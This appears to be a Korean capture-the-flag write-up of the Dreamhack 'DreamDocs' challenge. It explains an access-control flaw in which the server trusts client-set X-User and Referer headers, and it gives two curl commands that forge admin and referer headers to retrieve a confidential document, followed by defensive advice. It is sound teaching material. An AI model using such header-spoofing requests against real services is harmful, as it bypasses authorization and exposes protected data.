---
layout: post
title:  "Dreamhack 워게임 DreamDocs 풀이 — Trusting client headers + dict insertion order: 두 가지가 만나면 IDOR"
date:   2026-05-16 14:00:00 +0900
categories: security web wargame dreamhack writeup idor access-control
---

## 들어가며

Dreamhack 웹해킹 워게임 **DreamDocs** (난이도 Bronze 3) 풀이입니다. 사이버보안 입문 학생에게 **"클라이언트 헤더를 신뢰하는 access control"** 의 위험을 가장 짧게 보여주는 IDOR 문제. 거기에 Python 의 **dict insertion order** 라는 사소한 디테일이 정답을 더 깔끔하게 만들어 줍니다.

문제 설명:

> Introducing DreamDocs: a platform for browsing docs!

스포일러로 결론 — `curl` 두 줄.

```bash
# 1) X-User: admin 으로 documents 목록 받기 → confidential doc 의 id 가 1번째에 등장
DOC_ID=$(curl -s "$SERVER/api/docs" -H "X-User: admin" \
  | python3 -c "import sys,json; print(next(x['id'] for x in json.load(sys.stdin) if x['classification']=='confidential'))")

# 2) Referer: /share, X-User: admin 으로 doc 열기 → flag 가 HTML 주석에 박혀 있음
curl -s "$SERVER/doc/$DOC_ID" -H "X-User: admin" -H "Referer: $SERVER/share" \
  | grep -oE 'DH\{[^}]+\}'
# → DH{17dda847500b779845306c8d0f16959b}
```

핵심 두 줄:

1. **`X-User`, `Referer`** 같은 클라이언트가 보내는 헤더로 권한/출처 검증 → curl 한 줄에 우회.
2. flag 가 들어있는 document 가 dict 의 **첫 번째** 로 insert 되어 있어 `/api/docs` 의 15개 limit 안에 무조건 포함.

> Note: 사이버보안 입문 학습용 PoC. 실제 운영 서비스 대상 사용 금지.

## 1. 소스 정독

### 1-1. flag 가 어디 박혀있나

```python
flag_doc_id = random.randint(100, 999)

documents = {
    flag_doc_id: {
        'title': 'Confidential Report - Access Restricted',
        'content': f'... <!-- FLAG: {FLAG} -->\n\n...',
        'classification': 'confidential',
        'author': 'System Administrator'
    }
}

for i in range(1000):
    if i not in documents:
        documents[i] = { ... }
```

- flag_doc_id 는 100~999 의 랜덤 ID.
- 그 doc 의 `content` 안에 HTML 주석으로 flag 가 박힘.
- classification = 'confidential'.

**중요한 디테일**: documents 에 **flag_doc_id 가 가장 먼저 insert** 된다. 그 다음 loop 가 i=0..999 를 insert (단 flag_doc_id 는 skip). Python 3.7+ 의 dict 는 **insertion order 보존** 이므로 dict 순회 시 flag_doc_id 가 **첫 번째** 로 나온다.

### 1-2. 권한 체크 두 군데

```python
@app.route('/doc/<int:doc_id>')
def view_document(doc_id):
    referer = request.headers.get('Referer', '')
    user_level = request.headers.get('X-User', 'guest')
    ...
    if '/share' not in referer:
        return error("...only from share page"), 403
    
    if document['classification'] == 'confidential':
        if user_level != 'admin':
            return error("Admin only"), 403
    elif document['classification'] == 'internal':
        if user_level == 'guest':
            return error("auth needed"), 401
    ...
    return render_template('document.html', doc=document, doc_id=doc_id)
```

```python
@app.route('/api/docs')
def list_docs():
    SHOW_COUNT = 15
    user_level = request.headers.get('X-User', 'guest')
    visible_docs = []
    
    for doc_id, doc in documents.items():
        if doc['classification'] == 'public':
            visible_docs.append(...)
        elif doc['classification'] == 'internal' and user_level != 'guest':
            visible_docs.append(...)
        elif doc['classification'] == 'confidential' and user_level == 'admin':
            visible_docs.append(...)
        if len(visible_docs) >= SHOW_COUNT:
            break
    return jsonify(visible_docs)
```

권한 체크가 두 헤더를 신뢰한다:

- **`X-User: admin`** 으로 set 만 하면 admin 권한 행사.
- **`Referer: .../share`** 만 포함하면 share 페이지에서 온 것으로 인정.

둘 다 **클라이언트가 임의로 set 가능한 헤더**. 서버는 검증 안 함.

### 1-3. 결정적 단서

- `X-User` 헤더는 어떠한 세션/인증 매개체와도 연결돼 있지 않다. user 가 헤더를 그냥 보내면 그 user_level 그대로 적용.
- `/api/docs` 가 confidential 도 list 에 넣어준다 — admin 일 때만, 그러나 admin 은 우리가 헤더로 자처할 수 있음.
- 그리고 flag_doc_id 는 dict 첫 번째 → list 의 첫 entry 로 보장.

## 2. 익스플로잇 (curl 두 줄)

```bash
SERVER=http://<host>:<port>

# 1) confidential doc 의 ID 받기
DOC_ID=$(curl -s "$SERVER/api/docs" -H "X-User: admin" \
  | python3 -c "import sys,json; \
       print(next(x['id'] for x in json.load(sys.stdin) if x['classification']=='confidential'))")
echo "ID: $DOC_ID"
# → ID: 742  (실행마다 random)

# 2) doc 본문 받기 + flag 추출
curl -s "$SERVER/doc/$DOC_ID" -H "X-User: admin" -H "Referer: $SERVER/share" \
  | grep -oE 'DH\{[^}]+\}'
# → DH{17dda847500b779845306c8d0f16959b}
```

flag: `DH{17dda847500b779845306c8d0f16959b}` ✓

## 3. 취약점 해설 — Client-Trusted Auth & IDOR

### 3-1. 본 문제의 본질

이 클래스는 두 가지 잘못된 가정의 합:

> 1. **`X-User`, `Referer` 같은 헤더를 사용자가 위조할 수 없다** 는 가정.
> 2. **랜덤 ID 가 충분한 보안 (security by obscurity)** 이라는 가정.

가정 1 은 즉시 깨진다 — curl/Postman/브라우저 DevTools 누구나 임의 헤더 전송 가능.
가정 2 는 본 문제처럼 그 ID 가 어디선가 list 되면 즉시 무력화. 또는 brute force 100-999 (단 900회). brute force 가 금지된 상황에서도 list 로 얻을 수 있어 결정론적 우회 가능.

### 3-2. 같은 클래스의 실무 사례

- **백오피스 / 사내 도구의 `X-Internal-User` 같은 헤더 기반 권한**. 외부 리버스 프록시가 항상 그 헤더를 세팅한다고 가정. 우회: 직접 origin 에 헤더 보내기.
- **`Referer: trusted-origin.com` 으로 CSRF 방어** — 클라이언트가 헤더 떼거나 위조 가능.
- **GraphQL endpoint 의 `__typename` 또는 `internal: true` flag** 를 클라이언트가 보내는 경우.

### 3-3. 위험성

- 본 문제는 단순 정보 노출이지만, 같은 패턴으로 **인증/권한이 통째로 우회**되는 경우가 흔하다.
- `X-User: admin` 이 통하면 거의 항상 다른 admin-only endpoint 도 같은 헤더로 우회 가능.
- 랜덤 ID 가 SECURE 라고 믿는 모든 인덱스 페이지 / sitemap / search 가 lookup 채널.

### 3-4. 올바른 방어

1. **클라이언트 헤더로 권한 결정하지 마라**. 서버 측 세션 / JWT (signed) / cookie 만 신뢰.

   ```python
   user = session.get('user') or jwt_verify(request.headers.get('Authorization'))
   if user.role != 'admin': abort(403)
   ```

2. **`Referer` 는 보안 결정에 사용 금지**. CSRF 방어에는 SameSite cookie + CSRF token 사용.

3. **민감 자원의 ID 는 UUIDv4** 같이 충분한 entropy + 절대 list/sitemap 에 노출 안 함.

4. **인덱스/리스트 endpoint 에서 confidential 항목은 별도 권한 체크 후 별도 endpoint 로**. 같은 endpoint 에서 sensitive 와 public 을 섞으면 분류 실수가 즉시 누설로 이어짐.

5. **민감 데이터는 응답 본문에 절대 박지 말 것**. HTML 주석 안에 `<!-- FLAG: ... -->` 같은 패턴은 source view 한 줄에 폭로. 별도 endpoint + 권한 + audit log.

## 4. 정리 — 입문자가 가져갈 교훈

- **HTTP 헤더는 클라이언트가 자유롭게 위조** 한다. 권한 결정에 `X-User`, `X-Role`, `Referer`, `X-Forwarded-For` 같은 헤더만 보면 무의미.
- 서버 측 권한은 **검증 가능한 토큰** (signed JWT / 세션 쿠키 + 서버 저장소) 에서만 도출.
- Python 의 **dict insertion order** 는 보안적으로도 의미가 있다. "첫 번째 insert 된 항목" 이 list 의 맨 앞으로 나오므로, 그 순서를 신뢰한 ID-by-obscurity 는 깨진다.
- 민감 정보를 HTML 주석/메타데이터/응답 본문에 박지 말 것. source view 가 가장 쉬운 attack surface.

같은 카테고리의 다음 단계로 **IDOR Advanced**, **OAuth state validation**, **JWT signature confusion** 같은 문제를 풀어 보면 좋습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. 처음에 flag_doc_id 를 brute force 해야 하나 고민

description 상 doc_id 가 100-999 random 이라 "900 회 시도면 끝" 이라고 잠깐 생각. 그러나 우리 원칙 (brute force 금지) 적용하니 답이 아니다. 곧 `/api/docs` 가 admin 권한일 때 confidential 도 list 한다는 것을 보고 결정론적 경로 확인.

**회고**: 항상 **결정론적 경로** 부터 찾자. brute force 는 sandbox/wargame 의 의도된 풀이가 아닌 한 거의 항상 의도가 아니다.

### 실패 2. dict insertion order 의 의미를 한 번 더 짚어야 했음

처음에 `/api/docs` 가 confidential 을 list 에 넣어주는 것까지 확인했지만, 15개 안에 들어올지 의심. 그러다 코드의 `documents = {flag_doc_id: ...}` 가 dict 초기화 시 **첫 번째 entry** 라는 점을 인지. Python 3.7+ dict 는 insertion order 보존 → 순회 시 첫 번째 → list 의 첫 entry.

**회고**: Python dict 의 insertion order 보존은 보안 분석 시 자주 결정적 단서. **데이터 구조 초기화 순서** 가 사용자에게 노출되는 결과의 순서를 좌우하는 경우가 많다.

### 실패 3. `Referer` 헤더의 substring 검사

`if '/share' not in referer` — substring 검사. `Referer: http://anything/share` 만 보내면 통과. 처음에 정확한 origin 인지 신경 쓰다가, substring 임을 알고 그냥 `$SERVER/share` 박음.

**회고**: substring 검사 (`in`, `contains`, `indexOf`) 형태의 보안 체크는 거의 항상 우회 가능. 정확한 URL 비교는 항상 **parse + 비교** 로 해야 한다 — `urlparse(referer).path == '/share'` 같은 식.

### 실패 4. HTML 주석 안 flag 를 grep 으로 못 찾을 뻔

처음 doc 응답을 받은 뒤 `grep DH{` 안 통해서 잠시 멈춤. 응답이 HTML escape 되어 `<!--` 가 `&lt;!--` 로 인코딩됐을 가능성 의심. 다행히 HTML 주석은 escape 없이 그대로 박혀서 `grep -oE 'DH\{[^}]+\}'` 한 줄로 추출 가능.

**회고**: 응답을 grep 할 때는 **HTML escape 여부** 를 먼저 확인. raw 와 escaped 두 패턴 모두 시도하는 게 안전.
